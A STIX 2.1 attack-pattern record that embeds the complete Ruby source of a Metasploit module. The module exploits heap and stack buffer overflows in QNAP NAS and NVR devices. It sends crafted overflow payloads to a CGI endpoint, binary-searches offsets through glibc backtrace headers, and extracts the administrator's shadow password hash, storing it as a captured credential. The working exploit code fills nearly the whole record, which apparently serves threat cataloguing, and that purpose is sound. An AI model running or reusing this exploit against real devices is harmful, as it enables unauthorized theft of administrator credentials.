{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c91154ef-0251-425c-a256-b515e502e797",
    "created": "2024-08-14T16:31:31.352899Z",
    "modified": "2024-08-14T16:31:31.352902Z",
    "name": "QNAP NAS/NVR Administrator Hash Disclosure",
    "description": " This module exploits combined heap and stack buffer overflows for QNAP NAS and NVR devices to dump the admin (root) shadow hash from memory via an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.  A binary search is performed to find the correct offset for the BOFs. Since the server forks, blind remote exploitation is possible, provided the heap does not have ASLR. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/qnap_backtrace_admin_hash.rb",
            "external_id": "qnap_backtrace_admin_hash.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Feb/2"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/Binary_search_algorithm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'QNAP NAS/NVR Administrator Hash Disclosure',\n      'Description'    => %q{\n        This module exploits combined heap and stack buffer overflows for QNAP\n        NAS and NVR devices to dump the admin (root) shadow hash from memory via\n        an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.\n\n        A binary search is performed to find the correct offset for the BOFs.\n        Since the server forks, blind remote exploitation is possible, provided\n        the heap does not have ASLR.\n      },\n      'Author'         => [\n        'bashis',      # Vuln/PoC\n        'wvu',         # Module\n        'Donald Knuth' # Algorithm\n      ],\n      'References'     => [\n        ['URL', 'https://seclists.org/fulldisclosure/2017/Feb/2'],\n        ['URL', 'https://en.wikipedia.org/wiki/Binary_search_algorithm']\n      ],\n      'DisclosureDate' => '2017-01-31',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [\n        ['Automatic', 'Description' => 'Automatic targeting'],\n        ['x86',       'Description' => 'x86 target', offset: 0x16b2],\n        ['ARM',       'Description' => 'ARM target', offset: 0x1562]\n      ],\n      'DefaultAction'  => 'Automatic',\n      'DefaultOptions' => {\n        'SSL'          => true\n      }\n    ))\n\n    register_options([\n      Opt::RPORT(443),\n      OptInt.new('OFFSET_START', [true, 'Starting offset (backtrace)', 2000]),\n      OptInt.new('OFFSET_END',   [true, 'Ending offset (no backtrace)', 5000]),\n      OptInt.new('RETRIES',      [true, 'Retry count for the attack', 10])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/cgi-bin/authLogin.cgi'\n    )\n\n    if res && res.code == 200 && (xml = res.get_xml_document)\n      info = []\n\n      %w{modelName version build patch}.each do |node|\n        info << xml.at(\"//#{node}\").text\n      end\n\n      @target = (xml.at('//platform').text == 'TS-NASX86' ? 'x86' : 'ARM')\n      vprint_status(\"QNAP #{info[0]} #{info[1..-1].join('-')} detected\")\n\n      if Rex::Version.new(info[1]) < Rex::Version.new('4.2.3')\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Detected\n      end\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    if check == Exploit::CheckCode::Safe\n      print_error('Device does not appear to be a QNAP')\n      return\n    end\n\n    admin_hash = nil\n\n    (0..datastore['RETRIES']).each do |attempt|\n      vprint_status(\"Retry #{attempt} in progress\") if attempt > 0\n      break if (admin_hash = dump_hash)\n    end\n\n    if admin_hash\n      print_good(\"Hopefully this is your hash: #{admin_hash}\")\n      credential_data = {\n        workspace_id:    myworkspace_id,\n        module_fullname: self.fullname,\n        username:        'admin',\n        private_data:    admin_hash,\n        private_type:    :nonreplayable_hash,\n        jtr_format:      'md5crypt'\n      }.merge(service_details)\n      create_credential(credential_data)\n    else\n      print_error('Looks like we didn\\'t find the hash :(')\n    end\n\n    vprint_status(\"#{@cnt} HTTP requests were sent during module run\")\n  end\n\n  def dump_hash\n    l = datastore['OFFSET_START']\n    r = datastore['OFFSET_END']\n\n    start = Time.now\n    t     = binsearch(l, r)\n    stop  = Time.now\n\n    time = stop - start\n    vprint_status(\"Binary search of #{l}-#{r} completed in #{time}s\")\n\n    if action.name == 'Automatic'\n      target = actions.find do |tgt|\n        tgt.name == @target\n      end\n    else\n      target = action\n    end\n\n    return if t.nil? || @offset.nil? || target.nil?\n\n    offset = @offset - target[:offset]\n\n    find_hash(t, offset)\n  end\n\n  def find_hash(t, offset)\n    admin_hash = nil\n\n    # Off by one or two...\n    2.times do\n      t += 1\n\n      if (res = send_request(t, [offset].pack('V')))\n        if (backtrace = find_backtrace(res))\n          token = backtrace[0].split[4]\n        end\n      end\n\n      if token && token.start_with?('$1$')\n        admin_hash = token\n        addr       = \"0x#{offset.to_s(16)}\"\n        vprint_status(\"Admin hash found at #{addr} with offset #{t}\")\n        break\n      end\n    end\n\n    admin_hash\n  end\n\n  # Shamelessly stolen from Knuth\n  def binsearch(l, r)\n    return if l > r\n\n    @m = ((l + r) / 2).floor\n\n    res = send_request(@m)\n\n    return if res.nil?\n\n    if find_backtrace(res)\n      l = @m + 1\n    else\n      r = @m - 1\n    end\n\n    binsearch(l, r)\n\n    @m\n  end\n\n  def send_request(m, ret = nil)\n    @cnt = @cnt.to_i + 1\n\n    payload = Rex::Text.encode_base64(\n      Rex::Text.rand_text(1) * m +\n      (ret ? ret : Rex::Text.rand_text(4))\n    )\n\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => '/cgi-bin/cgi.cgi',\n      #'vhost'    => 'Q',\n      'vars_get' => {\n        'u'      => 'admin',\n        'p'      => payload\n      }\n    )\n\n    res\n  end\n\n  def find_backtrace(res)\n    res.headers.find do |name, val|\n      if name.include?('glibc detected')\n        @offset = val.split[-2].to_i(16)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-31"
}